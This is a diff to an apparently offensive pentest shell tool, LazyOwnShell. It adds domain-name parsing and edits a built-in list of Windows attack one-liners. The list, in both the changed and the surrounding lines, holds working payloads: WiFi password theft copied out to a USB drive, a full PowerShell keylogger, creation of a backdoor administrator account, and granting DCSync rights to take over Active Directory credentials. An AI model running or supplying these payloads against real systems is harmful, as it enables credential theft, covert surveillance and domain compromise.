@@ -5130,6 +5130,10 @@ class LazyOwnShell(Cmd):
         lhost = self.params["lhost"]
         lport = self.params["lport"]
         url = self.params["url"]
+        domain = self.params["domain"]
+        asub = domain.split(".")
+        name = asub[0]
+        ext = asub[1]
         if not check_lhost(lhost):
             return
 
@@ -5197,8 +5201,8 @@ class LazyOwnShell(Cmd):
             ("WIN WifiGrab", "powershell -NoP -NonI -W Hidden -Exec Bypass \"(netsh wlan show profiles) | Select-String '\\:(.+)$' | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name=$name key=clear)} | Select-String 'Key Content\\W+\\:(.+)$' | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Export-Csv c:\\windows\\temp\\temp.csv; cp c:\\windows\\temp\\temp.csv -destination $((gwmi -Query \\\"Select * from Win32_LogicalDisk where VolumeName='USB_DRIVE_LABEL'\\\").DeviceID); ri c:\\windows\\temp\\temp.csv -force"),
             ("WIN Keylogger", "$code = {function My-Keypresses($Path=\"$env:temp\\mykeypress.txt\") \n{\n  $signatures = @\'\n[DllImport(\"user32.dll\", CharSet=CharSet.Auto, ExactSpelling=true)] \npublic static extern short GetAsyncKeyState(int virtualKeyCode); \n[DllImport(\"user32.dll\", CharSet=CharSet.Auto)]\npublic static extern int GetKeyboardState(byte[] keystate);\n[DllImport(\"user32.dll\", CharSet=CharSet.Auto)]\npublic static extern int MapVirtualKey(uint uCode, int uMapType);\n[DllImport(\"user32.dll\", CharSet=CharSet.Auto)]\npublic static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);\n\'@\n\n  $API = Add-Type -MemberDefinition $signatures -Name \'Win32\' -Namespace API -PassThru\n    \n  $null = New-Item -Path $Path -ItemType File -Force\n\n  try\n  {\n\n    while ($true) {\n      Start-Sleep -Milliseconds 40\n      \n      for ($ascii = 9; $ascii -le 254; $ascii++) {\n        $state = $API::GetAsyncKeyState($ascii)\n\n        if ($state -eq -32767) {\n          $null = [console]::CapsLock\n\n          $virtualKey = $API::MapVirtualKey($ascii, 3)\n\n          $kbstate = New-Object Byte[] 256\n          $checkkbstate = $API::GetKeyboardState($kbstate)\n\n          $mychar = New-Object -TypeName System.Text.StringBuilder\n\n          $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)\n\n          if ($success) \n          {\n            [System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::Unicode) \n          }\n        }\n      }\n    }\n  }\n  finally\n  {\n  }\n}}; $timeoutSeconds = 10; $j = Start-Job -ScriptBlock $code; if (Wait-Job $j -Timeout $timeoutSeconds) { Receive-Job $j }; Remove-Job -force $j"),
             ("WIN CREATE USER", "powershell $pass = ConvertTo-SecureString \"Lazy0wn#1\" -AsPlainText -Force; New-LocalUser \"lazyown\" -Password $pass; Add-LocalGroupMember -Group \"Administrators\" -Member \"lazyown\" "),
-            ("WIN CREATE USER 2", "net user lazyown abc123! /add /domain && net group \"Exchange Windows Permissions\" lazyown /add && net localgroup \"Remote Management Users\" lazyown /add"),
-            ("WIN Add-ObjectACL","$pass = convertto-securestring 'abc123!' -asplain -force ; $cred = new-object system.management.automation.pscredential('htb\lazyown', $pass) ; Add-ObjectACL -PrincipalIdentity lazyown -Credential $cred -Rights DCSync"),
+            ("WIN CREATE USER 2", "net user lazyown abc123! /add /domain ; net group \"Exchange Windows Permissions\" lazyown /add ; net localgroup \"Remote Management Users\" lazyown /add"),
+            ("WIN Add-ObjectACL",f"$pass = convertto-securestring 'abc123!' -asplain -force ; $cred = new-object system.management.automation.pscredential('htb\lazyown', $pass) ; Add-DomainObjectAcl -Credential $cred -TargetIdentity \"DC={name}, DC={ext}\" -PrincipalIdentity lazyown -Rights DCSync"),
             ("WIN find password", "findstr /SIM /C:\"password\" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml"),
             ("WIN List Directory", "dir"),
             ("WIN Find index.php in current dir", "dir /s /w /b index.php"),
